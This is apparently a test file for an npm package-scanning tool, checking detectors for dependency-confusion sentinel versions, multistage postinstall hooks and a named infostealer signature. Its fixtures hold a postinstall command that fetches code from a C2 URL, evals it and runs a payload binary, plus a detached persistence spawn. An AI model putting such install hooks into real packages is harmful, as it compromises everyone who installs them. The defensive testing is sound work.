import { test, describe } from 'node:test';
import assert from 'assert/strict';
import * as detectors from './detectors/index.js';

// ─── D6a — tier1-version-confusion ──────────────────────────────────

describe('D6a — tier1-version-confusion', () => {
  test('D6a: detects exact sentinel version 99.99.99', async () => {
    const pkg = { name: 'internal-utils', version: '99.99.99' };
    const findings = await detectors.runAll(pkg);
    const match = findings.find(f => f.id === 'TIER1-VERSION-CONFUSION');
    assert(match, 'Expected TIER1-VERSION-CONFUSION finding');
    assert.equal(match.confidence, 'HIGH');
    assert(match.confidenceScore >= 80, `confidenceScore ${match.confidenceScore} < 80`);
  });

  test('D6a: detects sentinel family versions 9.9.9 / 10.10.10 / 11.11.11', async () => {
    for (const version of ['9.9.9', '10.10.10', '11.11.11']) {
      const pkg = { name: 'corp-auth', version };
      const findings = await detectors.runAll(pkg);
      const match = findings.find(f => f.id === 'TIER1-VERSION-CONFUSION');
      assert(match, `Expected finding for version ${version}`);
      assert(match.confidenceScore >= 60, `confidenceScore ${match.confidenceScore} < 60 for version ${version}`);
    }
  });

  test('D6a: no finding on legitimate semver', async () => {
    const pkg = { name: 'lodash', version: '4.17.21' };
    const findings = await detectors.runAll(pkg);
    const match = findings.find(f => f.id === 'TIER1-VERSION-CONFUSION');
    assert(!match);
  });

  test('D6a: no finding on KNOWN_REPUTABLE_PACKAGES regardless of version', async () => {
    const pkg = { name: 'react', version: '99.99.99' };
    const findings = await detectors.runAll(pkg);
    const match = findings.find(f => f.id === 'TIER1-VERSION-CONFUSION');
    assert(!match);
  });
});

// ─── D6b — tier1-multistage-postinstall ──────────────────────────────

describe('D6b — tier1-multistage-postinstall', () => {
  test('D6b: detects two-stage download + binary execution in postinstall', async () => {
    const pkg = {
      name: 'malicious-pkg',
      version: '1.0.0',
      scripts: {
        postinstall: 'node -e "fetch(process.env.C2_URL).then(r=>r.text()).then(eval)" && execFile("./payload")',
      },
    };
    const findings = await detectors.runAll(pkg);
    const match = findings.find(f => f.id === 'TIER1-MULTISTAGE-POSTINSTALL');
    assert(match, 'Expected TIER1-MULTISTAGE-POSTINSTALL finding');
    assert.equal(match.confidence, 'HIGH');
    assert(match.confidenceScore >= 80, `confidenceScore ${match.confidenceScore} < 80`);
  });

  test('D6b: detects detached background process spawn', async () => {
    const pkg = {
      name: 'persist-pkg',
      version: '1.0.0',
      scripts: {
        postinstall: 'spawn("node", ["server.js"], { detached: true })',
      },
    };
    const findings = await detectors.runAll(pkg);
    const match = findings.find(f => f.id === 'TIER1-MULTISTAGE-POSTINSTALL');
    assert(match, 'Expected TIER1-MULTISTAGE-POSTINSTALL finding');
    assert(match.confidenceScore >= 75, `confidenceScore ${match.confidenceScore} < 75`);
  });

  test('D6b: no finding on clean build script', async () => {
    const pkg = {
      name: 'clean-pkg',
      version: '1.0.0',
      scripts: {
        postinstall: 'node build.js',
      },
    };
    const findings = await detectors.runAll(pkg);
    const match = findings.find(f => f.id === 'TIER1-MULTISTAGE-POSTINSTALL');
    assert(!match);
  });

  test('D6b: no duplicate finding when D3 already fires on same hook', async () => {
    const pkg = {
      name: 'dual-pkg',
      version: '1.0.0',
      scripts: {
        postinstall: 'node -e "fetch(process.env.C2_URL).then(r=>r.text()).then(eval)" && execFile("./payload")',
      },
    };
    const findings = await detectors.runAll(pkg);
    const d6bMatches = findings.filter(f => f.id === 'TIER1-MULTISTAGE-POSTINSTALL');
    assert(d6bMatches.length > 0, 'Expected at least one TIER1-MULTISTAGE-POSTINSTALL finding');
    assert.equal(d6bMatches[0].id, 'TIER1-MULTISTAGE-POSTINSTALL');
    assert(d6bMatches[0].id !== 'ATK-003');
  });
});

// ─── D2 Miasma Signature ────────────────────────────────────────────

describe('D2 — named signature', () => {
  test('D2 Miasma signature: detects "Miasma: The Spreading Blight" → CRITICAL', async () => {
    const pkg = { name: 'test-pkg', version: '1.0.0' };
    const jsFiles = [{ path: 'evil.js', content: 'const id = "Miasma: The Spreading Blight"; doEvil();' }];
    const findings = await detectors.runAll(pkg, jsFiles, {}, []);
    const match = findings.find(f => f.id === 'TIER1-INFOSTEALER');
    assert(match, 'Expected TIER1-INFOSTEALER finding from Miasma signature');
    assert.equal(match.confidence, 'CRITICAL');
    assert.equal(match.confidenceScore, 98);
    assert(match.evidence.some(e => e.includes('Miasma: The Spreading Blight')), 'evidence should contain the signature string');
  });
});
